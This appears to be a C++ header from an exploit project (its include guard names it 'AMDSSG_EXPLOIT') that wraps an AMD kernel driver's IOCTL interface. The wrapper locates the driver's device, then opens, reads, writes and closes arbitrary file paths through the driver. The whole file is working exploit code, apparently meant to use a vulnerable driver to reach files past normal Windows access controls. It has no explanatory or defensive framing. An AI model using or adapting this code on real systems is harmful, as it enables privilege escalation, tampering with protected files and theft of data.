#ifndef AMDSSG_EXPLOIT_AMDSSG_H
#define AMDSSG_EXPLOIT_AMDSSG_H

#include <windows.h>
#include <iostream>
#include <cfgmgr32.h>
#include <initguid.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define AMDSSG_IOCTL_OPEN_FILE  0x222828
#define AMDSSG_IOCTL_CLOSE_FILE 0x222830
#define AMDSSG_IOCTL_R_W_FILE   0x222834

DEFINE_GUID(GUID_AMD_LFFSR,
            0xEBD5EFC4, 0x27AD, 0x4CD0,
            0xAC, 0x13, 0x62, 0x79, 0xED, 0x7D, 0xB6, 0x99);

#define LFFSR_ACCESS_READ   0x1
#define LFFSR_ACCESS_WRITE  0x2
#define LFFSR_ACCESS_RDWR   0x3

#define LFFSR_OP_READ   1
#define LFFSR_OP_WRITE  2

#define LFFSR_STATUS_SUCCESS            0
#define LFFSR_STATUS_ERROR              1
#define LFFSR_STATUS_DRIVER_MISMATCH    2
#define LFFSR_STATUS_INVALID_PARAMETER  3
#define LFFSR_STATUS_INVALID_HANDLE     4
#define LFFSR_STATUS_PENDING           12

namespace Legend {

#pragma pack(push, 1)
    typedef struct _LFFSR_OPEN_INPUT {
        uint32_t session_id;
        uint32_t reserved_0;
        wchar_t  file_path[260];
        uint8_t  padding[0x210 - 0x008 - (260 * sizeof(wchar_t))];
        uint32_t access_flags;
        uint8_t  tail[576 - 0x214];
    } LFFSR_OPEN_INPUT, *PLFFSR_OPEN_INPUT;

    typedef struct _LFFSR_OPEN_OUTPUT {
        uint8_t  echoed_input[576];
        uint32_t error_code;
        uint64_t file_handle;
        uint8_t  tail[640 - 576 - 4 - 8];
    } LFFSR_OPEN_OUTPUT, *PLFFSR_OPEN_OUTPUT;

    typedef struct _LFFSR_CLOSE_INPUT {
        uint32_t session_id;
        uint32_t reserved_0;
        uint64_t file_handle;
        uint8_t  tail[64 - 0x10];
    } LFFSR_CLOSE_INPUT, *PLFFSR_CLOSE_INPUT;

    typedef struct _LFFSR_CLOSE_OUTPUT {
        uint8_t  echoed_input[64];
        uint32_t error_code;
        uint8_t  tail[128 - 64 - 4];
    } LFFSR_CLOSE_OUTPUT, *PLFFSR_CLOSE_OUTPUT;

    typedef struct _LFFSR_RW_INPUT {
        uint32_t session_id;
        uint32_t reserved_0;
        uint32_t operation;
        uint64_t context;
        uint64_t file_handle;
        uint64_t buffer_address;
        uint32_t length;
        int64_t  byte_offset;
        uint8_t  tail[64 - 0x34];
    } LFFSR_RW_INPUT, *PLFFSR_RW_INPUT;

    typedef struct _LFFSR_RW_OUTPUT {
        uint8_t  echoed_input[64];
        uint32_t error_code;
        uint64_t bytes_transferred;
        uint8_t  tail[128 - 64 - 4 - 8];
    } LFFSR_RW_OUTPUT, *PLFFSR_RW_OUTPUT;
#pragma pack(pop)

    class AMDSSG {
    private:
        HANDLE  device_handle;
        uint32_t session_id;
        bool    connected;

    public:
        AMDSSG() : device_handle(INVALID_HANDLE_VALUE), session_id(0), connected(false) {}

        ~AMDSSG() {
            Disconnect();
        }

        auto Connect(uint32_t sid) -> bool {
            ULONG buf_len = 0;

            CONFIGRET cr = CM_Get_Device_Interface_List_SizeW(
                &buf_len,
                (LPGUID)&GUID_AMD_LFFSR,
                NULL,
                CM_GET_DEVICE_INTERFACE_LIST_PRESENT);

            if (cr != CR_SUCCESS || buf_len <= 1) {
                SetLastError(ERROR_DEV_NOT_EXIST);
                return false;
            }

            wchar_t *iface_list = (wchar_t *)HeapAlloc(
                GetProcessHeap(), HEAP_ZERO_MEMORY, buf_len * sizeof(wchar_t));

            if (!iface_list) {
                SetLastError(ERROR_OUTOFMEMORY);
                return false;
            }

            cr = CM_Get_Device_Interface_ListW(
                (LPGUID)&GUID_AMD_LFFSR,
                NULL,
                iface_list,
                buf_len,
                CM_GET_DEVICE_INTERFACE_LIST_PRESENT);

            if (cr != CR_SUCCESS || !iface_list[0]) {
                HeapFree(GetProcessHeap(), 0, iface_list);
                SetLastError(ERROR_DEV_NOT_EXIST);
                return false;
            }

            device_handle = CreateFileW(
                iface_list,
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL);

            HeapFree(GetProcessHeap(), 0, iface_list);

            if (device_handle == INVALID_HANDLE_VALUE)
                return false;

            session_id = sid;
            connected = true;
            return true;
        }

        auto Disconnect() -> void {
            if (device_handle != INVALID_HANDLE_VALUE) {
                CloseHandle(device_handle);
                device_handle = INVALID_HANDLE_VALUE;
            }
            connected = false;
        }

        [[nodiscard]] auto GetDeviceHandle() const -> HANDLE { return device_handle; }
        [[nodiscard]] auto GetSessionId() const -> uint32_t { return session_id; }
        [[nodiscard]] auto IsConnected() const -> bool { return connected; }

        auto OpenFile(const wchar_t *file_path, uint32_t access_flags, PLFFSR_OPEN_OUTPUT out) -> NTSTATUS {
            if (!connected || !file_path || !out)
                return (NTSTATUS)0xC000000DL;

            LFFSR_OPEN_INPUT  input_buf;
            LFFSR_OPEN_OUTPUT output_buf;
            DWORD bytes_returned = 0;

            memset(&input_buf, 0, sizeof(input_buf));
            memset(&output_buf, 0, sizeof(output_buf));

            input_buf.session_id = session_id;
            wcsncpy_s(input_buf.file_path, _countof(input_buf.file_path), file_path, _TRUNCATE);
            input_buf.access_flags = access_flags;

            BOOL ok = DeviceIoControl(
                device_handle,
                AMDSSG_IOCTL_OPEN_FILE,
                &input_buf, sizeof(input_buf),
                &output_buf, sizeof(output_buf),
                &bytes_returned,
                NULL);

            memcpy(out, &output_buf, sizeof(output_buf));

            if (!ok) {
                DWORD err = GetLastError();
                return (NTSTATUS)(err == ERROR_SUCCESS ? 0xC0000001L : (0xC0000000L | err));
            }

            if (output_buf.error_code != LFFSR_STATUS_SUCCESS)
                return (NTSTATUS)0xC0000001L;

            return (NTSTATUS)0;
        }

        auto CloseFile(uint64_t file_handle, PLFFSR_CLOSE_OUTPUT out = nullptr) -> NTSTATUS {
            if (!connected)
                return (NTSTATUS)0xC000000DL;

            LFFSR_CLOSE_INPUT  input_buf;
            LFFSR_CLOSE_OUTPUT output_buf;
            DWORD bytes_returned = 0;

            memset(&input_buf, 0, sizeof(input_buf));
            memset(&output_buf, 0, sizeof(output_buf));

            input_buf.session_id = session_id;
            input_buf.file_handle = file_handle;

            BOOL ok = DeviceIoControl(
                device_handle,
                AMDSSG_IOCTL_CLOSE_FILE,
                &input_buf, sizeof(input_buf),
                &output_buf, sizeof(output_buf),
                &bytes_returned,
                NULL);

            if (out)
                memcpy(out, &output_buf, sizeof(output_buf));

            if (!ok)
                return (NTSTATUS)0xC0000001L;

            return (NTSTATUS)0;
        }

        auto ReadFile(uint64_t file_handle, void *buffer, uint32_t length,
                       int64_t offset, PLFFSR_RW_OUTPUT out = nullptr) -> NTSTATUS {
            if (!connected || !buffer)
                return (NTSTATUS)0xC000000DL;

            LFFSR_RW_INPUT  input_buf;
            LFFSR_RW_OUTPUT output_buf;
            DWORD bytes_returned = 0;

            memset(&input_buf, 0, sizeof(input_buf));
            memset(&output_buf, 0, sizeof(output_buf));

            input_buf.session_id = session_id;
            input_buf.operation = LFFSR_OP_READ;
            input_buf.file_handle = file_handle;
            input_buf.buffer_address = (uint64_t)(uintptr_t)buffer;
            input_buf.length = length;
            input_buf.byte_offset = offset;

            BOOL ok = DeviceIoControl(
                device_handle,
                AMDSSG_IOCTL_R_W_FILE,
                &input_buf, sizeof(input_buf),
                &output_buf, sizeof(output_buf),
                &bytes_returned,
                NULL);

            if (out)
                memcpy(out, &output_buf, sizeof(output_buf));

            if (!ok)
                return (NTSTATUS)0xC0000001L;

            if (output_buf.error_code == LFFSR_STATUS_PENDING)
                return (NTSTATUS)0x00000103L;

            return (output_buf.error_code == LFFSR_STATUS_SUCCESS)
                ? (NTSTATUS)0
                : (NTSTATUS)0xC0000001L;
        }

        auto WriteFile(uint64_t file_handle, const void *buffer, uint32_t length,
                        int64_t offset, PLFFSR_RW_OUTPUT out = nullptr) -> NTSTATUS {
            if (!connected || !buffer)
                return (NTSTATUS)0xC000000DL;

            LFFSR_RW_INPUT  input_buf;
            LFFSR_RW_OUTPUT output_buf;
            DWORD bytes_returned = 0;

            memset(&input_buf, 0, sizeof(input_buf));
            memset(&output_buf, 0, sizeof(output_buf));

            input_buf.session_id = session_id;
            input_buf.operation = LFFSR_OP_WRITE;
            input_buf.file_handle = file_handle;
            input_buf.buffer_address = (uint64_t)(uintptr_t)buffer;
            input_buf.length = length;
            input_buf.byte_offset = offset;

            BOOL ok = DeviceIoControl(
                device_handle,
                AMDSSG_IOCTL_R_W_FILE,
                &input_buf, sizeof(input_buf),
                &output_buf, sizeof(output_buf),
                &bytes_returned,
                NULL);

            if (out)
                memcpy(out, &output_buf, sizeof(output_buf));

            if (!ok)
                return (NTSTATUS)0xC0000001L;

            if (output_buf.error_code == LFFSR_STATUS_PENDING)
                return (NTSTATUS)0x00000103L;

            return (output_buf.error_code == LFFSR_STATUS_SUCCESS)
                ? (NTSTATUS)0
                : (NTSTATUS)0xC0000001L;
        }
    };
}

#endif